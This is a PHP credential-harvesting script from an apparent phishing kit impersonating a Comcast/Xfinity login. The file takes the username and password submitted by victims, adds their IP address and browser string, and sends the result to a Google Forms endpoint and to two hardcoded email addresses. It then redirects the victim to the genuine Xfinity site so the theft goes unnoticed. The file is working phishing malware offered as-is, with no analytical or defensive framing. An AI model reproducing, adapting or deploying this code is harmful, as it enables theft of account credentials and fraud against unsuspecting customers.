<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Comcast r3ZulT -----------------------\n";
$message .= "Username: ".$_POST['UserId']."\n";
$message .= "Password: ".$_POST['Passcode']."\n";
$message .= "IP: ".$ip."\n";
$message .= "UA: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-----------------------------\n";

$name = base64_encode($_SERVER['REMOTE_ADDR']);
$feedback = base64_encode($message);

$url =  "https://docs.google.com/forms/d/e/1FAIpQLSfGeJvIdbryMfVSVAxltkqi2MKjT9Ef4UykDTdnd2RMLFSx0Q/formResponse";

//$fields = "ifq&entry.2092238618=$data&entry.1556369182=$data&submit=Submit";
$pf['entry.1777278597'] = $name;
$pf['entry.547019504'] = $feedback;
$pf['submit'] = 'Submit';

foreach ( $pf as $key => $value) {
	$post_items[] = $key . '=' . $value;
}

//create the final string to be posted using implode()
$post_string = implode ('&', $post_items);

//create cURL connection
$curl_connection = curl_init($url);

//set options
curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);

//set data to be posted
curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);

//perform our request
$result = curl_exec($curl_connection);

//close the connection
curl_close($curl_connection);

$email = "$ip"."@hackerz.com";
$recipient = "madmoneybox@gmail.com, madmoneybox@hotmail.com";
$subject = "comcast r3ZulT";
$headers = "From: $email\n";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
header("Location: https://connect.xfinity.com/voice");
?>